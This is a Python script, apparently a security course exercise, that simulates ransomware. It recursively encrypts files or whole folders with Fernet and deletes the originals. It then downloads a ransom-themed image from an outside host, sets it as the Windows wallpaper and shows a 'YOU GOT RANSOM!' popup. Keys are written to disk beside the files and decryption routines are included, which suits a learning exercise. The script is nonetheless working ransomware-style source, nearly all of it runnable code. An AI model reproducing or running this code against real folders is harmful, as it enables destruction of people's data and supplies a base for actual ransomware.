#!/usr/bin/python3

# Script : OpsChallenge08.py
# Purpose: Adding an option that gives us the ability to add a ransomware note visible to the Windows user
# Why    : Learn how to use Dialog Boxes with Python

from cryptography.fernet import Fernet  # Import Fernet from cryptography module to perform encryption and decryption
import os  # Import os module to interact with the file system
import tkinter as tk
from tkinter import messagebox
import urllib.request
import ctypes

def show_popup(title, message):
    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo(title, message)

def set_wallpaper_from_url(image_url):
    # Download the image and save it to a file
    file_path = os.path.join(os.path.expanduser('~'), 'Pictures', 'wallpaper.jpg')
    urllib.request.urlretrieve(image_url, file_path)

    # Set the wallpaper
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, file_path, 3)


def encrypt_file(file_path):
    with open(file_path, 'rb') as f:  # Open the file in read-binary mode
        data = f.read()  # Read the data from the file
    key = Fernet.generate_key()  # Generate a unique key
    cipher = Fernet(key)  # Create a Fernet instance with the generated key
    encrypted_data = cipher.encrypt(data)  # Encrypt the data
    with open(file_path + '.encrypted', 'wb') as f:  # Create a new file with a .encrypted extension to write the encrypted data
        f.write(encrypted_data)  # Write the encrypted data to the file
    os.remove(file_path)  # Remove the original file
    print('File encrypted successfully!')
    
    # Write the key to a separate file
    key_path = file_path + ".key"  # Generate a key file path
    with open(key_path, "wb") as f:  # Open the key file in write-binary mode
        f.write(key)  # Write the key to the key file

def decrypt_file(file_path):
    # Read the key from the separate file
    key_path = file_path.replace(".encrypted", "") + ".key"  # Generate the key file path
    with open(key_path, "rb") as f:  # Open the key file in read-binary mode
        key = f.read()  # Read the key

    # Decrypt the file
    with open(file_path, "rb") as f:  # Open the encrypted file in read-binary mode
        encrypted_data = f.read()  # Read the encrypted data
    fernet = Fernet(key)  # Create a Fernet instance with the key
    decrypted_data = fernet.decrypt(encrypted_data)  # Decrypt the data

    # Write the decrypted data to the file
    with open(file_path.replace(".encrypted", ""), "wb") as f:  # Open the file in write-binary mode
        f.write(decrypted_data)  # Write the decrypted data to the file

    # Delete the encrypted and the key file
    os.remove(key_path)  # Remove the key file
    os.remove(file_path)  # Remove the encrypted file

    print("File decrypted successfully.")

def encrypt_message(message):
    key = Fernet.generate_key()  # Generate a unique key
    cipher = Fernet(key)  # Create a Fernet instance with the generated key
    encrypted_message = cipher.encrypt(message.encode())  # Encrypt the message
    print('Encrypted message:', encrypted_message.decode())  # Print the encrypted message
    print('Key:', key.decode())  # Print the key

def decrypt_message(message):
    key = input('Enter the key: ').encode()  # Take the key as input and encode it
    cipher = Fernet(key)  # Create a Fernet instance with the entered key
    decrypted_message = cipher.decrypt(message.encode())  # Decrypt the message
    print('Decrypted message:', decrypted_message.decode())  # Print the decrypted message

def encrypt_folder(folder_path):
    for root, dirs, files in os.walk(folder_path):  # Traverse through the directory tree
        for file in files:
            if not file.endswith('.encrypted'):  # Check if the file is not already encrypted
                file_path = os.path.join(root, file)  # Generate the file path
                encrypt_file(file_path)  # Call crypt_file() on the encrypted file

def decrypt_folder(folder_path):
    for root, dirs, files in os.walk(folder_path):  # Traverse through the directory tree
        for file in files:
            if file.endswith('.encrypted'):  # Check if the file is already encrypted
                file_path = os.path.join(root, file)  # Generate the file path
                decrypt_file(file_path)  # Call decrypt_file() on the encrypted file

def main():
    mode = input('Select a mode:\n1. Encrypt a file\n2. Decrypt a file\n3. Encrypt a message\n4. Decrypt a message\n5. Encrypt a folder\n6. Decrypt a folder\n')
    if mode == '1':
        file_path = input('Enter file path: ')
        encrypt_file(file_path)
        set_wallpaper_from_url("https://i.ibb.co/HhyV7D4/DEma-G81-Xk-AAAg-Ss-1-1.jpg")
        show_popup('YOU GOT RANSOM!', 'Your file has been encrypted!')
    elif mode == '2':
        file_path = input('Enter file path including .encrypted file extension:')
        decrypt_file(file_path)
        show_popup('Decryption complete', 'Your file has been decrypted!')
    elif mode == '3':
        message = input('Enter message: ')
        encrypt_message(message)
        show_popup('Encryption complete', 'Your message has been encrypted!')
    elif mode == '4':
        message = input('Enter message: ')
        decrypt_message(message)
        show_popup('Decryption complete', 'Your message has been decrypted!')
    elif mode == '5':
        folder_path = input('Enter folder path: ')
        encrypt_folder(folder_path)
        set_wallpaper_from_url("https://i.ibb.co/HhyV7D4/DEma-G81-Xk-AAAg-Ss-1-1.jpg")
        show_popup('YOU GOT RANSOM!', 'Your folder has been encrypted!')
    elif mode == '6':
        folder_path = input('Enter folder path: ')
        decrypt_folder(folder_path)
        show_popup('Decryption complete', 'Your folder has been decrypted!')
    else:
        print('Invalid mode selected.')

main()
